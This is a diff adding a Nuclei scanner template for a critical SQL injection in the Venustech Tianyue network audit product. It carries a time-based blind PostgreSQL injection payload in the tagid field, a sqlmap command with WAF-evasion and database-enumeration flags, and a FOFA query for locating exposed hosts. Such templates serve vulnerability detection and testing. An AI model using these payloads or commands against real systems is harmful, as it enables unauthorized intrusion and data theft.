@@ -1,0 +1,35 @@
+id: tianyue-shenji-6-sql
+info:
+  name: tianyue-sql
+  author: sb
+  severity: critical
+  tags: sql,shenji
+  description: python3 sqlmap.py -u "https://ip:port/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123"  --skip-waf --random-agent --current-db                                                                          tips:多半是 postgresql , payload :checkname=123&tagid=123 AND 3679=(SELECT 3679 FROM PG_SLEEP(5))-- ucbn
+  reference: sb
+  metadata:
+    fofa-query: "product=启明星辰-天玥网络安全审计"
+    
+http:
+  - raw:
+      - |
+        POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded; charset=utf-8
+        
+        checkname=123&tagid=123%20AND%203679=(SELECT%203679%20FROM%20PG_SLEEP(2))--%20ucbn
+      - |
+        POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded; charset=utf-8
+        
+        checkname=123&tagid=123%20AND%203679=(SELECT%203679%20FROM%20PG_SLEEP(4))--%20ucbn
+        
+    req-condition: true    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl: 
+          - 'status_code_1 == 200 &&  status_code_2 == 200 && duration_1 < 3 && duration_2 < 5 && contains(body_1,"msg") && contains(body_1,"msg")'
+
+
+
